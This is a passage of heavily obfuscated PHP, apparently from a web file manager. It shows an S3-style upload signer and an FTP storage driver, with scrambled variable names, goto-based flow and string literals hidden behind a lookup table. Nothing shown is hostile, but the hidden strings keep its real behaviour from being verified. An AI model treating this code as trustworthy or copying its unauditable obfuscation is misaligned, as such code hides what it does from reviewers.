Model($eÑŞˆ‘§ğ[1774])->field($eÑŞˆ‘§ğ[1529])->where(array($eÑŞˆ‘§ğ[1693] => array($eÑŞˆ‘§ğ[7], $AÛÊ•İ‡§ë)))->select(); $d­²Á©°ì¯ = array_to_keyvalue($d­²Á©°ì¯, $eÑŞˆ‘§ğ[33], $eÑŞˆ‘§ğ[1529]); return array_unique($d­²Á©°ì¯); } public function userSearch($B‡ğââÔÈ, $AùˆÁÅÎ¸Â = "\x2a") { return Model($_SERVER[«¾°Ã¤][515])->where($B‡ğââÔÈ)->field($AùˆÁÅÎ¸Â)->find(); } } goto A·¯£‰ÍÙô; BÅÕ¶ê„Ô: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B‡Äøö˜Œ») { parent::__construct($B‡Äøö˜Œ»); $this->signatureVersion($_SERVER[«¾°Ã¤][212]); } public function uploadFormData($D“µÊˆ ù, $Côëì†¨ù = 3600) { goto dÃöĞİä¿‚; dÃöĞİä¿‚: $F¨·Ğ„¯Ø‚ =& $_SERVER[«¾°Ã¤]; $BÓÄ¢É©Ã = $F¨·Ğ„¯Ø‚[192]; $e²ÏŸÜğ‡æ = $F¨·Ğ„¯Ø‚[1225]; goto Dîêƒîæäœ; e„ƒâáæ§Ì: $EŸ‹ìÒ–²Ò = array($this->accessKey, $CÜ«×ºæ¯, $this->region, $EÛ¨…›‚‘, $Bº‰”…éÙê); $CİÔ˜’ÉøÍ = implode($F¨·Ğ„¯Ø‚[8], $EŸ‹ìÒ–²Ò); $A¶±£Ú†Ûõ = array($F¨·Ğ„¯Ø‚[1192] => gmdate($F¨·Ğ„¯Ø‚[1191], strtotime($F¨·Ğ„¯Ø‚[1228])), $F¨·Ğ„¯Ø‚[1193] => array(array($F¨·Ğ„¯Ø‚[1195] => $this->bucket), array($F¨·Ğ„¯Ø‚[1194] => $BÓÄ¢É©Ã), array($F¨·Ğ„¯Ø‚[1196], $F¨·Ğ„¯Ø‚[1197], $F¨·Ğ„¯Ø‚[33]), array($F¨·Ğ„¯Ø‚[1196], $F¨·Ğ„¯Ø‚[1229], $F¨·Ğ„¯Ø‚[33]), array($F¨·Ğ„¯Ø‚[1196], $F¨·Ğ„¯Ø‚[1230], $F¨·Ğ„¯Ø‚[33]), array($F¨·Ğ„¯Ø‚[1198] => $cŒ”ï¾™³ô), array($F¨·Ğ„¯Ø‚[1231] => $CİÔ˜’ÉøÍ), array($F¨·Ğ„¯Ø‚[1232] => $e²ÏŸÜğ‡æ), array($F¨·Ğ„¯Ø‚[1233] => $FĞŠ„‘®´), array($F¨·Ğ„¯Ø‚[1234] => $f¬£è‚ñ¬Œ))); goto f¾‘™ôô‹¿; a©Æß«œì‹: $DÛ¥éßĞé– = array($F¨·Ğ„¯Ø‚[211] => $F¨·Ğ„¯Ø‚[33], $F¨·Ğ„¯Ø‚[1237] => $F¨·Ğ„¯Ø‚[33], $F¨·Ğ„¯Ø‚[1194] => $BÓÄ¢É©Ã, $F¨·Ğ„¯Ø‚[1198] => $cŒ”ï¾™³ô, $F¨·Ğ„¯Ø‚[1202] => $dÒ‚‡¶ƒ‘á, $F¨·Ğ„¯Ø‚[1238] => $CİÔ˜’ÉøÍ, $F¨·Ğ„¯Ø‚[1239] => $e²ÏŸÜğ‡æ, $F¨·Ğ„¯Ø‚[1240] => $FĞŠ„‘®´, $F¨·Ğ„¯Ø‚[1241] => $f¬£è‚ñ¬Œ, $F¨·Ğ„¯Ø‚[1242] => $f­æ©Ö¡äè, $F¨·Ğ„¯Ø‚[175] => $this->getHost()); return $DÛ¥éßĞé–; goto B‰ óÙŒ·; Dîêƒîæäœ: $EÛ¨…›‚‘ = $F¨·Ğ„¯Ø‚[59]; $FĞŠ„‘®´ = gmdate($F¨·Ğ„¯Ø‚[1226]); $CÜ«×ºæ¯ = gmdate($F¨·Ğ„¯Ø‚[720]); goto fÒ‚™¢ˆÕÑ; f¾‘™ôô‹¿: $dÒ‚‡¶ƒ‘á = base64_encode(json_encode($A¶±£Ú†Ûõ)); $aÇÕä“Ñ = hash_hmac($F¨·Ğ„¯Ø‚[1235], $CÜ«×ºæ¯, $F¨·Ğ„¯Ø‚[1236] . $this->secret, !0); $e…¡¾«çÇô = hash_hmac($F¨·Ğ„¯Ø‚[1235], $this->region, $aÇÕä“Ñ, !0); goto c­Ğ¤…Şñæ; fÒ‚™¢ˆÕÑ: $Bº‰”…éÙê = $F¨·Ğ„¯Ø‚[1227]; $f¬£è‚ñ¬Œ = $Côëì†¨ù . $F¨·Ğ„¯Ø‚[33]; $cŒ”ï¾™³ô = $F¨·Ğ„¯Ø‚[1190]; goto e„ƒâáæ§Ì; c­Ğ¤…Şñæ: $b¤­ñ’º¿´ = hash_hmac($F¨·Ğ„¯Ø‚[1235], $EÛ¨…›‚‘, $e…¡¾«çÇô, !0); $e‰—ªÓÍ¬É = hash_hmac($F¨·Ğ„¯Ø‚[1235], $Bº‰”…éÙê, $b¤­ñ’º¿´, !0); $f­æ©Ö¡äè = hash_hmac($F¨·Ğ„¯Ø‚[1235], $dÒ‚‡¶ƒ‘á, $e‰—ªÓÍ¬É); goto a©Æß«œì‹; B‰ óÙŒ·: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($aé‡Ï§³È) { parent::__construct(); if (count($aé‡Ï§³È) > 0) { $this->_init($aé‡Ï§³È); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($c×õÙ¥„Ä) { $e‚æÕ±Ñ =& $_SERVER[«¾°Ã¤]; global $config; $this->appCharset = $config[$e‚æÕ±Ñ[1243]]; $this->systemCharset = $config[$e‚æÕ±Ñ[1244]]; if (isset($c×õÙ¥„Ä[$e‚æÕ±Ñ[1245]]) && $c×õÙ¥„Ä[$e‚æÕ±Ñ[1245]]) { $this->systemCharset = $c×õÙ¥„Ä[$e‚æÕ±Ñ[1245]]; } } public function iconvApp($dÁÁ­¨æğ×) { return $this->iconvTo($dÁÁ­¨æğ×, $this->systemCharset, $this->appCharset); } public function iconvSystem($cÒííôÎ’) { return $this->iconvTo($cÒííôÎ’, $this->appCharset, $this->systemCharset); } public function getPathOuter($a×ºÑ¹ë²Æ) { goto Aø™¿®  Š; Aø™¿®  Š: $dò¸øâ¼½§ =& $_SERVER[«¾°Ã¤]; $eÆ¼ Ğ© = $this->iconvApp($this->pathBase); $a×ºÑ¹ë²Æ = $this->iconvApp($a×ºÑ¹ë²Æ); goto a„‚Õ´°ù; a„‚Õ´°ù: if (substr($eÆ¼ Ğ©, 0, 2) == $dò¸øâ¼½§[1246]) { $eÆ¼ Ğ© = BASIC_PATH . substr($eÆ¼ Ğ©, 2); } if (substr($a×ºÑ¹ë²Æ, 0, 2) == $dò¸øâ¼½§[1246]) { $a×ºÑ¹ë²Æ = BASIC_PATH . substr($a×ºÑ¹ë²Æ, 2); } $eÆ¼ Ğ© = KodIO::clear($eÆ¼ Ğ©); goto Bº†÷Ú¤; DÁ‰ô÷óš‰: return $this->pathDriver . $dò¸øâ¼½§[8] . ltrim($a×ºÑ¹ë²Æ, $dò¸øâ¼½§[8]); goto EØ‘Ò»Ñ’; Bº†÷Ú¤: $a×ºÑ¹ë²Æ = KodIO::clear($a×ºÑ¹ë²Æ); $a×ºÑ¹ë²Æ = substr($a×ºÑ¹ë²Æ, strlen($eÆ¼ Ğ©)); if (empty($this->pathDriver)) { return $a×ºÑ¹ë²Æ; } goto DÁ‰ô÷óš‰; EØ‘Ò»Ñ’: } private function _init($cğìåîÕÑ = array()) { $AêŒòìŒê =& $_SERVER[«¾°Ã¤]; if (!function_exists($AêŒòìŒê[1247])) { throw new Exception(LNG($AêŒòìŒê[1248])); } $this->config = $cğìåîÕÑ; $this->charsetReset($cğìåîÕÑ); foreach ($cğìåîÕÑ as $c„¾æ¿êÖ« => $c’Ø¡ÅÕƒÊ) { if (isset($this->{$c„¾æ¿êÖ«})) { $this->{$c„¾æ¿êÖ«} = $c’Ø¡ÅÕƒÊ; } } return $this->_login($cğìåîÕÑ); } private function _login($F¢ªÎºÛ) { goto D··½ˆÚ¨¨; Bõè¨›¦‡½: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $bÃ¢ï•«‹† = $this->pasv == $FİÈˆ‹›õá[87] ? !0 : !1; @ftp_pasv($this->connect, $bÃ¢ï•«‹†); goto cßˆ‡‡Ò‹©; aù½Å¯§×ˆ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Fõí–ˆ²ƒ = @ftp_login($this->connect, $this->username, $this->userpass); goto Bõè¨›¦‡½; FÍ¢ó†·‰: if (isset($cæˆğÍëã÷[$cª±é»ëê])) { foreach ($cæˆğÍëã÷[$cª±é»ëê] as $Bè¨œ–Ó©» => $dğš®ø¦°·) { $this->{$Bè¨œ–Ó©»} = $dğš®ø¦°·; } return !0; } $C¤¿–¼ÛÀ¶ = parse_url(trim($this->server, $FİÈˆ‹›õá[8])); $this->host = $C¤¿–¼ÛÀ¶[$FİÈˆ‹›õá[175]]; goto d´Ô§¦Şíˆ; D··½ˆÚ¨¨: $FİÈˆ‹›õá =& $_SERVER[«¾°Ã¤]; static $cæˆğÍëã÷ = array(); $cª±é»ëê = md5(json_encode($F¢ªÎºÛ)); goto FÍ¢ó†·‰; cßˆ‡‡Ò‹©: $cæˆğÍëã÷[$cª±é»ëê] = array($FİÈˆ‹›õá[1252] => $this->connect, $FİÈˆ‹›õá[175] => $this->host, $FİÈˆ‹›õá[174] => $this->scheme, $FİÈˆ‹›õá[176] => $this->port); return $Fõí–ˆ²ƒ; goto CÃ´¡›Øøœ; d´Ô§¦Şíˆ: $cô°òÌÃ‰¢ = isset($C¤¿–¼ÛÀ¶[$FİÈˆ‹›õá[174]]) && $C¤¿–¼ÛÀ¶[$FİÈˆ‹›õá[174]] == $FİÈˆ‹›õá[1249] ? !0 : !1; $this->scheme = $cô°òÌÃ‰¢ ? $FİÈˆ‹›õá[1250] : $FİÈˆ‹›õá[1251]; $this->port = isset($C¤¿–¼ÛÀ¶[$FİÈˆ‹›õá[176]]) ? $C¤¿–¼ÛÀ¶[$FİÈˆ‹›õá[176]] : 21; goto aù½Å¯§×ˆ; CÃ´¡›Øøœ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($AëÂÔ›à–Á, $d±¼¨â¹×´ = '', $BÓóãÁ‹Á = REPEAT_RENAME) { if ($this->setContent($AëÂÔ›à–Á, $d±¼¨â¹×´)) { return $this->getPathOuter($AëÂÔ›à–Á); } return !1; } public function mkdir($C¯²Ğè‡À£, $bÕÔ„‹áÖ– = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C¯²Ğè‡À£ = $this->iconvSystem($C¯²Ğè‡À£); if ($this->_isFolder($C¯²Ğè‡À£) || @ftp_mkdir($this->connect, $C¯²Ğè‡À£)) { return $this->getPathOuter($C¯²Ğè‡À£); } if (!$this->mkdir($this->pathFather($C¯²Ğè‡À£))) { return !1; } if ($C¯²Ğè‡À£ = @ftp_mkdir($this->connect, $C¯²Ğè‡À£)) { return $this->getPathOuter($C¯²Ğè‡À£); } return !1; } public function copyFile($c·™ÍÑ°¿, $d½Ô‘ÃÛ­) { goto eİº„¢ßÜ÷; Eˆá¸é§ğ˜: $this->tempFileRemve($C²…á¥›ö); return $aÁÜà¼´Ï³; goto BÇ´ùÏŒ; böÕôøÒ„÷: $b¤ï‘½× = $this->iconvApp($C²…á¥›ö); $this->download($c·™ÍÑ°¿, $b¤ï‘½×); $aÁÜà¼´Ï³ = $this->upload($d½Ô‘ÃÛ­, $b¤ï‘½×); goto Eˆá¸é§ğ˜; eİº„¢ßÜ÷: if (!$this->_isconn()) { return !1; } $c·¾¦ä‰Éí = $this->pathThis($this->iconvSystem($c·™ÍÑ°¿)); $C²…á¥›ö = $this->tempFile($c·¾¦ä‰Éí); goto böÕôøÒ„÷; BÇ´ùÏŒ: } public function moveFile($CÙƒÑ‹Í„—, $FãÖ­´ø¢é) { if (!$this->_isconn()) { return !1; } $CÙƒÑ‹Í„— = $this->iconvSystem($CÙƒÑ‹Í„—); $FãÖ­´ø¢é = $this->iconvSystem($FãÖ­´ø¢é); $f„‡æËñÇ = @ftp_rename($this->connect, $CÙƒÑ‹Í„—, $FãÖ­´ø¢é); return $f„‡æËñÇ ? $this->getPathOuter($FãÖ­´ø¢é) : !1; } public function delFile($E²šÄæÇè) { if (!$this->_isconn()) { return !1; } $E²šÄæÇè = $this->iconvSystem($E²šÄæÇè); return @ftp_delete($this->connect, $E²šÄæÇè); } public function delFolder($eì··Úã‚¦) { goto eëÑø½†›Û; BÔÈöÑ¼é«: $this->fileList($eì··Úã‚¦, $e×°¢×¤—ˆ, $Cœß•Œ‚Œ, !0); $this->listItemCache = !0; foreach ($Cœß•Œ‚Œ as $f®¯®Á¿Ìé) { $aÑŸª¿øˆ¦ = $this->iconvSystem($f®¯®Á¿Ìé[$_SERVER[«¾°Ã¤][28]]); $DÈ¬â½æ¹² = @ftp_delete($this->connect, $aÑŸª¿øˆ¦); if (!$DÈ¬â½æ¹²) { return !1; } } goto aÈ­ŒÌÓí±; eëÑø½†›Û: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $e×°¢×¤—ˆ = $Cœß•Œ‚Œ = array(); goto BÔÈöÑ¼é«; aÈ­ŒÌÓí±: foreach ($e×°¢×¤—ˆ as $aÑŸª¿øˆ¦) { $aÑŸª¿øˆ¦ = $this->iconvSystem($aÑŸª¿øˆ¦); $DÈ¬â½æ¹² = @ftp_rmdir($this->connect, $aÑŸª¿øˆ¦); if (!$DÈ¬â½æ¹²) { return !1; } } $eì··Úã‚¦ = $this->iconvSystem($eì··Úã‚¦); return @ftp_rmdir($this->connect, $eì··Úã‚¦); goto d£…±º‘óÓ; d£…±º‘óÓ: } public function rename($dÈèÃº Œ÷, $B”ã‚«ØÖ—) { goto b˜èîï¤Â¦; aÚÕø«í…†: $D­É¿»Ñ›¶ = rtrim($aøê‰™ñ¸Õ, $B›•‹ê…õÈ[8]) . $B›•‹ê…õÈ[8] . $DĞÁÁ›Ú; $a¼Ç­µÇˆ× = @ftp_rename($this->connect, $dÈèÃº Œ÷, $D­É¿»Ñ›¶); $D­É¿»Ñ›¶ = $this->iconvApp($D­É¿»Ñ›¶); goto FñÌĞÚÂ˜; FñÌĞÚÂ˜: return $a¼Ç­µÇˆ× ? $this->getPathOuter($D­É¿»Ñ›¶) : !1; goto eóÓÊïƒ·; b˜èîï¤Â¦: $B›•‹ê…õÈ =& $_SERVER[«¾°Ã¤]; if (!$this->_isconn()) { return !1; } $DĞÁÁ›Ú = $this->fileNameAuto($this->pathFather($dÈèÃº Œ÷), $B”ã‚«ØÖ—); goto f©ò¤Â®…­; f©ò¤Â®…­: $DĞÁÁ›Ú = $this->iconvSystem($DĞÁÁ›Ú); $dÈèÃº Œ÷ = $this->iconvSystem($dÈèÃº Œ÷); $aøê‰™ñ¸Õ = $this->pathFather($dÈèÃº Œ÷); goto aÚÕø«í…†; eóÓÊïƒ·: } private function folderInfo($A›Âäœ®ğ†, $BÎ‹¼Û‹™˜ = false) { $CİÄù†ğ” =& $_SERVER[«¾°Ã¤]; $FÁïè…çŒö = array($CİÄù†ğ”[28] => $this->pathThis($A›Âäœ®ğ†), $CİÄù†ğ”[76] => $this->getPathOuter($CİÄù†ğ”[8] . $A›Âäœ®ğ†), $CİÄù†ğ”[29] => $CİÄù†ğ”[77]); if ($BÎ‹¼Û‹™˜) { return $FÁïè…çŒö; } $FÁïè…çŒö[$CİÄù†ğ”[194]] = $FÁïè…çŒö[$CİÄù†ğ”[84]] = 0; $FÁïè…çŒö[$CİÄù†ğ”[195]] = $FÁïè…çŒö[$CİÄù†ğ”[196]] = !0; return $FÁïè…çŒö; } private function fileInfo($C¿ˆˆœæÍÏ, $AÙù²Üîˆ— = false, $d™ŠÜŠšƒÓ = array()) { goto cŠôçêŒƒØ; F×¤„¤ĞçÀ: $c±Õ©‘¤ÅĞ[$få©·£ì²[84]] = @ftp_mdtm($this->connect, $B´‡ïÜøì); if (empty($d™ŠÜŠšƒÓ)) { $d™ŠÜŠšƒÓ = $this->objectMeta($C¿ˆˆœæÍÏ); if (!$d™ŠÜŠšƒÓ) { return $c±Õ©‘¤ÅĞ; } } $c±Õ©‘¤ÅĞ[$få©·£ì²[78]] = $d™ŠÜŠšƒÓ[$få©·£ì²[78]]; goto EØ¼Ëç¤ß±; cŠôçêŒƒØ: $få©·£ì² =& $_SERVER[«¾°Ã¤]; $c±Õ©‘¤ÅĞ = array($få©·£ì²[28] => $this->pathThis($C¿ˆˆœæÍÏ), $få©·£ì²[76] => $this->getPathOuter($få©·£ì²[8] . $C¿ˆˆœæÍÏ), $få©·£ì²[29] => $få©·£ì²[193], $få©·£ì²[78] => isset($d™ŠÜŠšƒÓ[$få©·£ì²[78]]) ? $d™ŠÜŠšƒÓ[$få©·£ì²[78]] : 0, $få©·£ì²[168] => $this->ext($C¿ˆˆœæÍÏ)); if ($AÙù²Üîˆ—) { return $c±Õ©‘¤ÅĞ; } goto EÈ¬Ö¸ÔµÊ; EØ¼Ëç¤ß±: return $c±Õ©‘¤ÅĞ; goto cíâìĞíç®; EÈ¬Ö¸ÔµÊ: $c±Õ©‘¤ÅĞ[$få©·£ì²[194]] = $c±Õ©‘¤ÅĞ[$få©·£ì²[84]] = 0; $c±Õ©‘¤ÅĞ[$få©·£ì²[195]] = $c±Õ©‘¤ÅĞ[$få©·£ì²[196]] = !0; $B´‡ïÜøì = $this->iconvSystem($C¿ˆˆœæÍÏ); goto F×¤„¤ĞçÀ; cíâìĞíç®: } public function size($DŞ†æ†ä«Ö) { $C„™ •¹ˆ¦ = $this->objectMeta($DŞ†æ†ä«Ö); return $C„™ •¹ˆ¦ ? $C„™ •¹ˆ¦[$_SERVER[«¾°Ã¤][78]] : 0; } public function info($F…öÏñ‡¯•) { if ($this->isFile($F…öÏñ‡¯•)) { return $this->fileInfo($F…öÏñ‡¯•, 0); } else { if ($this->isFolder($F…öÏñ‡¯•)) { return $this->folderInfo($F…öÏñ‡¯•); } } return !1; } private function fileList($A¤•¾‘¼ªí, &$D‰¥ç¢ŠÅ», &$F¬îÕŠö‡Ñ, $DÂš×Ş…† = false) { goto CãÆÚ¸èÄæ; CãÆÚ¸èÄæ: $cÜµÑ¢•Ê =& $_SERVER[«¾°Ã¤]; $A¤•¾‘¼ªí = $this->iconvSystem($A¤•¾‘¼ªí); if (!$this->isFolder($A¤•¾‘¼ªí)) { return !1; } goto CŒï¦¨®†õ; Bª„¿õ·‰: $fœæÊ»ÂëÑ = $this->listItemCache === !1 ? !1 : !0; $eÇŞŸ¦˜Öù = @ftp_rawlist($this->connect, $A¤•¾‘¼ªí); if (!$eÇŞŸ¦˜Öù) { $eÇŞŸ¦˜Öù = array(); } goto b…Ì«ÙİäÖ; b…Ì«ÙİäÖ: $bÙØˆë©‹£ = array($cÜµÑ¢•Ê[95] => 1, $cÜµÑ¢•Ê[1253] => 1); foreach ($eÇŞŸ¦˜Öù as $d´¤‚æÕ†) { goto FÉĞëœ×; DÆÒİçå‡³: if (empty($bùâ„¶—ƒ„) && $bùâ„¶—ƒ„ !== $cÜµÑ¢•Ê[191] || isset($bÙØˆë©‹£[$bùâ„¶—ƒ„])) { continue; } $bùâ„¶—ƒ„ = $this->iconvApp($A¤•¾‘¼ªí . ltrim($bùâ„¶—ƒ„, $cÜµÑ¢•Ê[8])); $DÃÎŒÑºµ® = array($cÜµÑ¢•Ê[28] => $bùâ„¶—ƒ„, $cÜµÑ¢•Ê[29] => $cÜµÑ¢•Ê[193], $cÜµÑ¢•Ê[78] => $aÒí‰éŠ›©[4]); goto EŠ¿±Ï¦; EŠ¿±Ï¦: if (substr($d´¤‚æÕ†, 0, 1) == $cÜµÑ¢•Ê[1254]) { $DÃÎŒÑºµ®[$cÜµÑ¢•Ê[29]] = $cÜµÑ¢•Ê[77]; $DÃÎŒÑºµ®[$cÜµÑ¢•Ê[78]] = 0; } $FÛ¯Âåƒï = $DÃÎŒÑºµ®[$cÜµÑ¢•Ê[29]] == $cÜµÑ¢•Ê[77] ? !0 : !1; if ($fœæÊ»ÂëÑ) { $this->cacheMethod($cÜµÑ¢•Ê[199], $bùâ„¶—ƒ„, $FÛ¯Âåƒï); $this->cacheMethod($cÜµÑ¢•Ê[200], $bùâ„¶—ƒ„, $DÃÎŒÑºµ®); } goto fòÎŠÄ¿ÈÒ; FÉĞëœ×: $aÒí‰éŠ›© = $this->_listItem($d´¤‚æÕ†); if ($aÒí‰éŠ›©[0] == $cÜµÑ¢•Ê[728]) { continue; } $bùâ„¶—ƒ„ = $aÒí‰éŠ›©[8]; goto DÆÒİçå‡³; fòÎŠÄ¿ÈÒ: if ($FÛ¯Âåƒï) { $D‰¥ç¢ŠÅ»[] = $bùâ„¶—ƒ„; if ($DÂš×Ş…†) { $this->fileList($bùâ„¶—ƒ„, $D‰¥ç¢ŠÅ», $F¬îÕŠö‡Ñ, $DÂš×Ş…†); } continue; } $F¬îÕŠö‡Ñ[] = $DÃÎŒÑºµ®; goto dâİÍ±”×¦; dâİÍ±”×¦: } if ($fœæÊ»ÂëÑ) { $this->cacheMethod($cÜµÑ¢•Ê[199], $A¤•¾‘¼ªí, !0); } goto B®÷ğÙàò“; CŒï¦¨®†õ: @ftp_chdir($this->connect, $cÜµÑ¢•Ê[8]); $A¤•¾‘¼ªí = rtrim($A¤•¾‘¼ªí, $cÜµÑ¢•Ê[8]) . $cÜµÑ¢•Ê[8]; check_abort(); goto Bª„¿õ·‰; B®÷ğÙàò“: } private function _listItem($b›óŞ‰ ‡¹) { if (empty($b›óŞ‰ ‡¹)) { return array(); } $d¬œ­º×ª = preg_split($_SERVER[«¾°Ã¤][1255], $b›óŞ‰ ‡¹); if (count($d¬œ­º×ª) <= 9) { return $d¬œ­º×ª; } $d¬œ­º×ª[8] = trim(substr($b›óŞ‰ ‡¹, strpos($b›óŞ‰ ‡¹, $d¬œ­º×ª[7]) + strlen($d¬œ­º×ª[7]))); return array_splice($d¬œ­º×ª, 0, 9); } public function listPath($fË³¬Ø­òœ, $bîÖ×‹Á” = false) { goto f—ìÌ‚™ìÈ; FäÙâ™õàÀ: $this->fileList($fË³¬Ø­òœ, $d¶˜İŸà¶, $eõé²ç‹¯ô); foreach ($d¶˜İŸà¶ as $FˆĞ¦ªÃ¥Ø => $Bƒ¦°Ò‰¯‘) { $d¶˜İŸà¶[$FˆĞ¦ªÃ¥Ø] = $this->folderInfo($Bƒ¦°Ò‰¯‘, $bîÖ×‹Á”); } foreach ($eõé²ç‹¯ô as $FˆĞ¦ªÃ¥Ø => $Bƒ¦°Ò‰¯‘) { $eõé²ç‹¯ô[$FˆĞ¦ªÃ¥Ø] = $this->fileInfo($Bƒ¦°Ò‰¯‘[$D˜ƒ˜ŸòŒ[28]], $bîÖ×‹Á”, $Bƒ¦°Ò‰¯‘); } goto CëÒªØæ; f—ìÌ‚™ìÈ: $D˜ƒ˜ŸòŒ =& $_SERVER[«¾°Ã¤]; if (!$this->_isconn()) { return !1; } $d¶˜İŸà¶ = $eõé²ç‹¯ô = array(); goto FäÙâ™õàÀ; CëÒªØæ: return array($D˜ƒ˜ŸòŒ[75] => $d¶˜İŸà¶, $D˜ƒ˜ŸòŒ[74] => $eõé²ç‹¯ô); goto EŸ†â…­¡; EŸ†â…­¡: } public function has($CÑÚáàò›Ç, $Eˆ•˜‹ƒ† = false, $BöãàÉÀÚ = true) { goto bùšÁÇÉÌÖ; BÁãë±£‚â: return !1; goto c ‘†»–æ; bùšÁÇÉÌÖ: $B„ÁÁ×Ã¤Æ =& $_SERVER[«¾°Ã¤]; $b÷Ò¡àÖ’ = $f™ù®êàÅß = array(); $fƒóÄŸ‹‚÷ = $Eˆ•˜‹ƒ† ? !0 : !1; goto C¾¨“ –êé; C¾¨“ –êé: $this->fileList($CÑÚáàò›Ç, $b÷Ò¡àÖ’, $f™ù®êàÅß, $fƒóÄŸ‹‚÷); if ($Eˆ•˜‹ƒ†) { return array($B„ÁÁ×Ã¤Æ[203] => count($f™ù®êàÅß), $B„ÁÁ×Ã¤Æ[204] => count($b÷Ò¡àÖ’)); } if ($BöãàÉÀÚ) { if (count($f™ù®êàÅß)) { return !0; } } else { if (count($b÷Ò¡àÖ’)) { return !0; } } goto BÁãë±£‚â; c ‘†»–æ: } public function listAll($FÛäŒÊ¹) { goto fÓ¥ğ‘ì°¸; FÅÄ­ãøÓî: $this->fileList($FÛäŒÊ¹, $B¼†ø–±¾§, $AĞŠ‡ÛÌ¥ , !0); $bñŒ…°¨Øˆ = array(); foreach ($AĞŠ‡ÛÌ¥  as $A°Ö¬ˆµØ‹) { $bñŒ…°¨Øˆ[$A°Ö¬ˆµØ‹[$Aí³Å³Œ•õ[28]]] = $A°Ö¬ˆµØ‹[$Aí³Å³Œ•õ[78]]; } goto aø §ëæ˜Û; aø §ëæ˜Û: foreach ($B¼†ø–±¾§ as $A°Ö¬ˆµØ‹) { if (is_string($A°Ö¬ˆµØ‹)) { $bñŒ…°¨Øˆ[$A°Ö¬ˆµØ‹] = 0; } } return $this->listAllFiles($FÛäŒÊ¹, array_keys($bñŒ…°¨Øˆ), $bñŒ…°¨Øˆ); goto d²ê„Ù»Ï¢; fÓ¥ğ‘ì°¸: $Aí³Å³Œ•õ =& $_SERVER[«¾°Ã¤]; if (!$this->_isconn()) { return !1; } $B¼†ø–±¾§ = $AĞŠ‡ÛÌ¥  = array(); goto FÅÄ­ãøÓî; d²ê„Ù»Ï¢: } public function getContent($CêÜÏÖô¼§) { if (!$this->_isconn()) { return !1; } $CêÜÏÖô¼§ = $this->iconvSystem($CêÜÏÖô¼§); return $this->fileSubstr($CêÜÏÖô¼§); } public function setContent($fº¶õî‚Œá, $AóÇ’êí„Ğ = '') { goto Fï„„È ®Õ; B°ª¦‚Ñƒ¥: file_put_contents($a†×Ñ§¾›¡, $AóÇ’êí„Ğ); $B§ƒĞ‚†‰ = $this->upload($fº¶õî‚Œá, $this->iconvApp($a†×Ñ§¾›¡)); $this->tempFileRemve($a†×Ñ§¾›¡); goto E×ÑòÄ•Ï´; Fï„„È ®Õ: if (!$this->_isconn()) { return !1; } $FŒÏÑè‹ÇŞ = $this->pathThis($this->iconvSystem($fº¶õî‚Œá)); $a†×Ñ§¾›¡ = $this->tempFile($FŒÏÑè‹ÇŞ); goto B°ª¦‚Ñƒ¥; E×ÑòÄ•Ï´: return $B§ƒĞ‚†‰; goto d±Æ–˜²³¦; d±Æ–˜²³¦: } public function fileSubstr($EÚëÜ¸‰½, $e²ˆ‘ùâ¹… = 0, $EÊæË–åº = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EÚëÜ¸‰½, $e²ˆ‘ùâ¹…, $EÊæË–åº); } private function ftpRequest($d Œ‘‡°¡­, $bçƒ„ƒµ»¢ = 0, $b±òáº–£ô = false) { goto Eˆî—À†; Eˆî—À†: $d Œ‘‡°¡­ = $this->iconvSystem($d Œ‘‡°¡­); $eĞŒªÃÕŞá = $this->scheme . $this->host . $_SERVER[«¾°Ã¤][4] . $this->port; $b§ÌæãÅÚ· = curl_init(); goto e‚ÚÆœÃÚ; FŒ¦×Äö: return $FõµÛ£­¼¤; goto Dµã«‘‹; eÅ§¯¤í¬Ó: curl_setopt($b§ÌæãÅÚ·, CURLOPT_RETURNTRANSFER, 1); $FõµÛ£­¼¤ = curl_exec($b§ÌæãÅÚ·); curl_close($b§ÌæãÅÚ·); goto FŒ¦×Äö; e‚ÚÆœÃÚ: curl_setopt($b§ÌæãÅÚ·, CURLOPT_URL, $eĞŒªÃÕŞá . $this->pathEncode($d Œ‘‡°¡­)); curl_setopt($b§ÌæãÅÚ·, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($b±òáº–£ô) { $bº½±Êõ† = $bçƒ„ƒµ»¢ + $b±òáº–£ô - 1; curl_setopt($b§ÌæãÅÚ·, CURLOPT_RANGE, "{$bçƒ„ƒµ»¢}\x2d{$bº½±Êõ†}"); } goto eÅ§¯¤í¬Ó; Dµã«‘‹: } public function upload($D“Îá¹É±Ä, $C”å¨Ï²œ—, $a‚¯Áì‰Œ† = false, $eàËÏË‰øó = REPEAT_REPLACE) { goto fÃõà¹Ì‚Æ; CŞ¦–”ÈÄ¿: if ($d±»ÔãÍÛ¥ != FTP_FINISHED) { return !1; } return $this->getPathOuter($D“Îá¹É±Ä); goto cË‰ÌâùñÚ; b„£ÜÆ—ê¬: $C”å¨Ï²œ— = $this->iconvSystem($C”å¨Ï²œ—); $d±»ÔãÍÛ¥ = ftp_nb_put($this->connect, $D“Îá¹É±Ä, $C”å¨Ï²œ—, FTP_BINARY); while ($d±»ÔãÍÛ¥ == FTP_MOREDATA) { $d±»ÔãÍÛ¥ = ftp_nb_continue($this->connect); } goto CŞ¦–”ÈÄ¿; fÃõà¹Ì‚Æ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($D“Îá¹É±Ä))) { return !1; } $D“Îá¹É±Ä = $this->iconvSystem($D“Îá¹É±Ä); goto b„£ÜÆ—ê¬; cË‰ÌâùñÚ: } public function download($c…Ÿõ±Çó‘, $F¿²Œï½Ö = '') { goto bÔë¬ö¡¿æ; bÔë¬ö¡¿æ: if (!$this->_isconn()) { return !1; } $Aß°ÁŞªëµ = $this->pathFather($F¿²Œï½Ö); if (!IO::mkdir($Aß°ÁŞªëµ)) { return !1; } goto E±øóß¬´ˆ; f«Ôñœ•Ò: while ($BÉ¶›Åì…É == FTP_MOREDATA) 